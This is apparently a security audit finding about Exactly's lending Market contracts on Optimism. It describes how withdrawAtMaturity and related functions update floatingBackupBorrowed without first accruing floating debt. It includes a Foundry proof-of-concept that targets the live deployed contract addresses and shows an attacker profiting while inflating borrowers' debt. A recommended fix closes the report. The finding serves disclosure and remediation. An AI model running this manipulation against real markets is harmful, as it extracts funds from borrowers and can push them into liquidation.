---
id: 25164
severity: "Medium"
---

# Manipulation of the floating debt by updating floatingBackupBorrowed

## Description



## Proof of Concept

The following PoC executes this attack on the live contracts of Exactly in the Optimism chain. The test can be pasted into a new file within a forge environment. Also, the `.env` file must include the variable `OPTIMISM_RPC_URL` for the test to run. The test can be executed with the following command:

```solidity
forge test --match-test test_backup_borrowed --evm-version cancun
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import { Market } from "protocol/contracts/Market.sol";
import { InterestRateModel } from "protocol/contracts/InterestRateModel.sol";
import { FixedLib } from "protocol/contracts/utils/FixedLib.sol";
import {Test, console2, console} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract TestMarket is Test {

    Market marketOP = Market(0xa430A427bd00210506589906a71B54d6C256CEdb);
    Market marketUSDC = Market(0x81C9A7B55A4df39A9B7B5F781ec0e53539694873);

    IERC20 optimism = IERC20(0x4200000000000000000000000000000000000042);
    IERC20 usdc = IERC20(0x7F5c764cBc14f9669B88837ca1490cCa17c31607);

    uint256 public optimismFork;
    string OPTIMISM_RPC_URL = vm.envString("OPTIMISM_RPC_URL");

    function setUp() public {
        optimismFork = vm.createSelectFork(OPTIMISM_RPC_URL);
        assertEq(optimismFork, vm.activeFork());
    }

    function test_backup_borrowed() public {
        vm.rollFork(119348257); // Abr 28
        uint256 maturity = block.timestamp - (block.timestamp % 4 weeks) + 16 weeks;
        uint256 floatingLiquidity = 1_000_000e18;
        uint256 fixedLiquidity = 500_000e18;

        // Malicious user has deposited at variable rate on the OP market
        deal(address(optimism), address(this), floatingLiquidity);
        optimism.approve(address(marketOP), floatingLiquidity);
        marketOP.deposit(floatingLiquidity, address(this));
        marketOP.auditor().enterMarket(marketOP);

        vm.warp(block.timestamp + 2 weeks);

        // Simulate users borrowing from the OP market at fixed and floating rate
        address user = makeAddr("user");
        vm.startPrank(user);
        deal(address(usdc), user, 5_500_000e6);
        usdc.approve(address(marketUSDC), 5_500_000e6);
        marketUSDC.deposit(5_500_000e6, user);
        marketUSDC.auditor().enterMarket(marketUSDC);
        marketOP.borrowAtMaturity(maturity, 500_000e18, type(uint256).max, user, user);
        marketOP.borrow(500_000e18, user, user);
        vm.stopPrank();

        // Malicious user provides liquidity for the fixed pool
        deal(address(optimism), address(this), fixedLiquidity);
        optimism.approve(address(marketOP), fixedLiquidity);
        uint256 positionAssets = marketOP.depositAtMaturity(maturity, fixedLiquidity, 0, address(this));

        vm.warp(maturity - 1 days);

        uint256 floatingLiquidityBefore = marketOP.previewRedeem(marketOP.balanceOf(address(this)));

        // Malicious user executes the attack (withdraws all from fixed pool before maturity)
        uint256 assetsDiscounted = marketOP.withdrawAtMaturity(maturity, positionAssets, 0, address(this), address(this));

        uint256 floatingLiquidityAfter = marketOP.previewRedeem(marketOP.balanceOf(address(this)));
        uint256 profits = floatingLiquidityAfter - floatingLiquidityBefore;

        // Before the attack, the attacker owned 1,003,236 OP tokens
        assertEq(floatingLiquidityBefore, 1_003_236.895405543416809745e18);

        // After the attack, the attacker owns 1,027,162 OP tokens
        assertEq(floatingLiquidityAfter, 1_027_162.288501014638447865e18);

        // The attacker has made a profit of 23,925 OP tokens
        assertEq(profits, 23_925.39309547122163812e18);

        // The cost of the attack (early withdraw) is 488 OP tokens
        assertEq(positionAssets - assetsDiscounted, 488.538063290105034868e18);
    }
}
```

**Note:** The values used on the PoC are intentionally chosen or inflated to demonstrate the bug in the implementation, and they do not affect the validity of this issue.

## Vulnerability Detail

The floating interest rate directly depends on the utilization rate of the market, the higher the utilization, the higher the interest rate. Whenever the utilization rate of the market is updated, the floating debt must be accrued before. This is necessary to accrue all debt based on past utilization and not on the updated one to avoid manipulation.

This behavior is correctly implemented whenever we update `floatingDebt` and `floatingAssets`. Before these two values are updated, the past floating debt is accrued, we can check it in the following functions:

- [deposit/mint](<https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L711>)
- [withdraw/redeem](<https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L700>)
- [borrow](<https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L150>)
- [repay/refund](<https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L211>)

However, the utilization rate on the market depends on one more value, and that is the `floatingBackupBorrowed`. The issue is that when this value is updated (in the fixed-pool functions), the floating debt is not updated first. This issue will cause that when the floating debt hasn't been updated in a while, an attacker can update the value of `floatingBackupBorrowed`, manipulating the previously accrued debt, making it higher or lower than it should be.

Currently, 3 functions update the value of `floatingBackupBorrowed` without accruing the floating debt first:

1. `withdrawAtMaturity`
2. `repayAtMaturity`
3. `depositAtMaturity`

With the functions `repayAtMaturity` and `depositAtMaturity`, an attacker could deflate `floatingBackupBorrowed`, thus lowering the past accrued debt and making the borrowers of the floating pool pay less debt than they should.

However, an attacker can also use the function `withdrawAtMaturity` to inflate `floatingBackupBorrowed`, thus artificially incrementing the past accrued debt and making the borrowers of the floating pool pay more debt than they should. This attack would be profitable for the lenders of the floating pool because they'd receive more funds from the borrowers. Moreover, this unexpected jump in the accrued debt could make some borrowers go underwater and get liquidated.

## Impact

An attacker can call `withdrawAtMaturity` to inflate the value of `floatingBackupBorrowed` and artificially increment the accrued debt that the borrowers should pay lenders on the floating pool. This attack would profit the floating lenders while causing some borrowers to go into liquidation.

## Code Snippet

[https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L363](<https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L363>)

## Recommendation

To mitigate this issue is recommended to accrue the floating debt always before updating the value of `floatingBackupBorrowed`. An example of the implementation fix could be the following:

```diff
  function depositAtMaturity(
    uint256 maturity,
    uint256 assets,
    uint256 minAssetsRequired,
    address receiver
  ) external whenNotPaused whenNotFrozen returns (uint256 positionAssets) {
    // ...

+   depositToTreasury(updateFloatingDebt());

    floatingBackupBorrowed -= pool.deposit(assets);
    // ...
  }

  function withdrawAtMaturity(
    uint256 maturity,
    uint256 positionAssets,
    uint256 minAssetsRequired,
    address receiver,
    address owner
  ) external whenNotPaused returns (uint256 assetsDiscounted) {
    // ...

+   depositToTreasury(updateFloatingDebt());

    floatingBackupBorrowed = newFloatingBackupBorrowed;

    // ...
  }

  function noTransferRepayAtMaturity(
    uint256 maturity,
    uint256 positionAssets,
    uint256 maxAssets,
    address borrower,
    bool canDiscount
  ) internal returns (uint256 actualRepayAssets) {
    // ...

+   depositToTreasury(updateFloatingDebt());

    floatingBackupBorrowed -= pool.repay(principalCovered);

    // ...
  }
```
